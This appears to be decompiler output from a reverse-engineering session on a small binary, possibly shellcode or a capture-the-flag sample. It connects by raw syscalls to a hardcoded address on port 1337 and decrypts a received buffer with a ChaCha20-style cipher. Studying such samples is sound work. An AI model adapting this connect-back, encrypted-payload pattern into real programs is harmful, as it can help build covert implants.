/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall close(int fd@<eax>);
// void __usercall create_socket_and_connect(__int64 ip@<rax>, __int16 port@<dx>);
__int64 shutdown();
__int64 __fastcall decode2();
// void __usercall init_cipher2(const void *a1@<rax>, const void *a2@<rdx>, __int64 a3@<rcx>, __int64 a4@<r8>);
// void __usercall decode(unsigned __int64@<rax>, __int64@<rdx>, __int64@<rcx>);
__int64 __fastcall main_logic();


//----- (0000000000000000) ----------------------------------------------------
__int64 __fastcall sub_0(__int64 a1, __int64 a2)
{
  return main_logic(a1, a2);
}

//----- (000000000000000B) ----------------------------------------------------
void __usercall close(int fd@<eax>)
{
  __asm { syscall; Low latency system call }
}

//----- (000000000000001A) ----------------------------------------------------
void __usercall create_socket_and_connect(__int64 ip@<rax>, __int16 port@<dx>)
{
  int v2[4]; // [rsp+0h] [rbp-10h] BYREF

  __asm { syscall; Low latency system call }
  memset(v2, 0, sizeof(v2));
  __asm { syscall; Low latency system call }
}

//----- (000000000000008F) ----------------------------------------------------
__int64 shutdown()
{
  __int64 result; // rax

  result = 0x30i64;
  __asm { syscall; Low latency system call }
  return result;
}

//----- (00000000000000A2) ----------------------------------------------------
__int64 __fastcall decode2()
{
  _DWORD *v0; // rax
  _DWORD *v1; // rbx
  int i; // edx
  int j; // esi
  int k; // edx
  __int64 result; // rax

  v1 = v0;
  for ( i = 0; i < 16; ++i )
    v0[i] = v0[i + 32];
  for ( j = 0; j < 10; ++j )
  {
    *v1 += v1[4];
    v1[12] = rol4((unsigned int)(*v1 ^ v1[12]), 16i64);
    v1[8] += v1[12];
    v1[4] = rol4((unsigned int)(v1[8] ^ v1[4]), 12i64);
    *v1 += v1[4];
    v1[12] = rol4((unsigned int)(*v1 ^ v1[12]), 8i64);
    v1[8] += v1[12];
    v1[4] = rol4((unsigned int)(v1[8] ^ v1[4]), 7i64);
    v1[1] += v1[5];
    v1[13] = rol4((unsigned int)(v1[1] ^ v1[13]), 16i64);
    v1[9] += v1[13];
    v1[5] = rol4((unsigned int)(v1[9] ^ v1[5]), 12i64);
    v1[1] += v1[5];
    v1[13] = rol4((unsigned int)(v1[1] ^ v1[13]), 8i64);
    v1[9] += v1[13];
    v1[5] = rol4((unsigned int)(v1[9] ^ v1[5]), 7i64);
    v1[2] += v1[6];
    v1[14] = rol4((unsigned int)(v1[2] ^ v1[14]), 16i64);
    v1[10] += v1[14];
    v1[6] = rol4((unsigned int)(v1[10] ^ v1[6]), 12i64);
    v1[2] += v1[6];
    v1[14] = rol4((unsigned int)(v1[2] ^ v1[14]), 8i64);
    v1[10] += v1[14];
    v1[6] = rol4((unsigned int)(v1[10] ^ v1[6]), 7i64);
    v1[3] += v1[7];
    v1[15] = rol4((unsigned int)(v1[3] ^ v1[15]), 16i64);
    v1[11] += v1[15];
    v1[7] = rol4((unsigned int)(v1[11] ^ v1[7]), 12i64);
    v1[3] += v1[7];
    v1[15] = rol4((unsigned int)(v1[3] ^ v1[15]), 8i64);
    v1[11] += v1[15];
    v1[7] = rol4((unsigned int)(v1[11] ^ v1[7]), 7i64);
    *v1 += v1[5];
    v1[15] = rol4((unsigned int)(*v1 ^ v1[15]), 16i64);
    v1[10] += v1[15];
    v1[5] = rol4((unsigned int)(v1[10] ^ v1[5]), 12i64);
    *v1 += v1[5];
    v1[15] = rol4((unsigned int)(*v1 ^ v1[15]), 8i64);
    v1[10] += v1[15];
    v1[5] = rol4((unsigned int)(v1[10] ^ v1[5]), 7i64);
    v1[1] += v1[6];
    v1[12] = rol4((unsigned int)(v1[1] ^ v1[12]), 16i64);
    v1[11] += v1[12];
    v1[6] = rol4((unsigned int)(v1[11] ^ v1[6]), 12i64);
    v1[1] += v1[6];
    v1[12] = rol4((unsigned int)(v1[1] ^ v1[12]), 8i64);
    v1[11] += v1[12];
    v1[6] = rol4((unsigned int)(v1[11] ^ v1[6]), 7i64);
    v1[2] += v1[7];
    v1[13] = rol4((unsigned int)(v1[2] ^ v1[13]), 16i64);
    v1[8] += v1[13];
    v1[7] = rol4((unsigned int)(v1[8] ^ v1[7]), 12i64);
    v1[2] += v1[7];
    v1[13] = rol4((unsigned int)(v1[2] ^ v1[13]), 8i64);
    v1[8] += v1[13];
    v1[7] = rol4((unsigned int)(v1[8] ^ v1[7]), 7i64);
    v1[3] += v1[4];
    v1[14] = rol4((unsigned int)(v1[3] ^ v1[14]), 16i64);
    v1[9] += v1[14];
    v1[4] = rol4((unsigned int)(v1[9] ^ v1[4]), 12i64);
    v1[3] += v1[4];
    v1[14] = rol4((unsigned int)(v1[3] ^ v1[14]), 8i64);
    v1[9] += v1[14];
    v1[4] = rol4((unsigned int)(v1[9] ^ v1[4]), 7i64);
  }
  for ( k = 0; k < 16; ++k )
    v1[k] += v1[k + 32];
  result = (unsigned int)v1[44];
  if ( !(_DWORD)result )
    return (unsigned int)v1[45];
  return result;
}
// A9: variable 'v0' is possibly undefined
// F6A: using guessed type __int64 __fastcall sub_F6A(_QWORD, _QWORD);

//----- (0000000000000A93) ----------------------------------------------------
_DWORD *__fastcall init_cipher(const void *a1, const void *a2)
{
  _DWORD *v2; // rax
  _DWORD *v3; // rbx
  _DWORD *result; // rax

  v3 = v2;
  qmemcpy(v2 + 18, a2, 0x20ui64);
  qmemcpy(v2 + 26, a1, 0xCui64);
  v2[32] = HIDWORD((__int64)"expand 32-byte K");
  v3[33] = HIDWORD((__int64)"nd 32-byte K");
  v3[34] = HIDWORD((__int64)"2-byte K");
  v3[35] = HIDWORD((__int64)"te K");
  v3[36] = HIDWORD((__int64)a2);
  v3[37] = HIDWORD((__int64)a2 + 4);
  v3[38] = HIDWORD((__int64)a2 + 8);
  v3[39] = HIDWORD((__int64)a2 + 12);
  v3[40] = HIDWORD((__int64)a2 + 16);
  v3[41] = HIDWORD((__int64)a2 + 20);
  v3[42] = HIDWORD((__int64)a2 + 24);
  v3[43] = HIDWORD((__int64)a2 + 28);
  v3[44] = 0;
  v3[45] = HIDWORD((__int64)a1);
  v3[46] = HIDWORD((__int64)a1 + 4);
  v3[47] = HIDWORD((__int64)a1 + 8);
  result = v3 + 26;
  qmemcpy(v3 + 26, a1, 0xCui64);
  return result;
}
// A9E: variable 'v2' is possibly undefined

//----- (0000000000000CD2) ----------------------------------------------------
void __usercall init_cipher2(const void *a1@<rax>, const void *a2@<rdx>, __int64 a3@<rcx>, __int64 a4@<r8>)
{
  memset((void *)a1, 0, 0xC0ui64);
  init_cipher((const void *)a3, a2);
  *((_DWORD *)a1 + 44) = a4;
  *((_DWORD *)a1 + 45) = HIDWORD(a4) + HIDWORD((__int64)a1 + 104);
  *((_QWORD *)a1 + 15) = a4;
  *((_QWORD *)a1 + 8) = 64i64;
}

//----- (0000000000000D49) ----------------------------------------------------
void __usercall decode(unsigned __int64 a1@<rax>, __int64 a2@<rdx>, __int64 a3@<rcx>)
{
  unsigned __int64 i; // rbx

  for ( i = 0i64; i < a3; ++i )
  {
    if ( *(_QWORD *)(a1 + 64) >= 0x40ui64 )
    {
      decode2();
      *(_QWORD *)(a1 + 64) = 0i64;
    }
    *(_BYTE *)(i + a2) ^= *(_BYTE *)(*(_QWORD *)(a1 + 64) + a1);
    ++*(_QWORD *)(a1 + 64);
  }
}

//----- (0000000000000DC2) ----------------------------------------------------
__int64 __fastcall main_logic()
{
  char key[32]; // [rsp+410h] [rbp-1278h] BYREF
  char nonce[12]; // [rsp+430h] [rbp-1258h] BYREF
  char v3; // [rsp+46Dh] [rbp-121Bh]
  char read_buffer[128]; // [rsp+540h] [rbp-1148h] BYREF
  unsigned int read_buffer_len; // [rsp+15C4h] [rbp-C4h]
  _BYTE a1[192]; // [rsp+15C8h] [rbp-C0h] BYREF

  create_socket_and_connect(0xA00020Fi64, 1337);
  __asm
  {
    syscall; Low latency system call
    syscall; Low latency system call
    syscall; Low latency system call
    syscall; Low latency system call
  }
  v3 = 0;
  __asm
  {
    syscall; Low latency system call
    syscall; Low latency system call
  }
  read_buffer_len = strlen(read_buffer);
  init_cipher2(a1, key, (__int64)nonce, 0i64);
  decode((unsigned __int64)a1, (__int64)read_buffer, read_buffer_len);
  __asm
  {
    syscall; Low latency system call
    syscall; Low latency system call
  }
  close(2);
  shutdown();
  return 0i64;
}
// DC2: using guessed type char key[32];

//----- (0000000000000F20) ----------------------------------------------------
__int64 __usercall sub_F20@<rax>(__int64 val@<rax>)
{
  return (*(unsigned __int8 *)(val + 3) << 24) | (*(unsigned __int8 *)(val + 2) << 16) | (unsigned int)*(unsigned __int16 *)val;
}

//----- (0000000000000F6A) ----------------------------------------------------
__int64 __fastcall rol4(__int64 a1, char a2)
{
  int v2; // eax

  return (unsigned int)__ROL4__(v2, a2);
}
// F7D: variable 'v2' is possibly undefined

// nfuncs=11 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
